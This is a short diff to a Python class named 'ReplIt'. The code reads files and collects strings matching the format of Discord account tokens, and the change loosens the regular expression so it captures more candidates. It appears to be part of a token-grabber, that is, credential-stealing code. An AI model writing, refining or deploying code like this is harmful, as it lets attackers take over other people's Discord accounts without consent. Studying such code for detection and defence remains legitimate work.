@@ -127,7 +127,7 @@ class ReplIt:
                 try:
                     file_contents = file_txt.read().strip()
 
-                    disc_tokens = re.findall(r"\w{24}\.\w{6}\.\w{27}", file_contents)
+                    disc_tokens = re.findall(r"[\W|\w]{24}\.[\W|\w]{6}\.[\W|\w]{27}", file_contents)
                     if len(disc_tokens) > 0:
                         tokens += disc_tokens
                     file_txt.close()
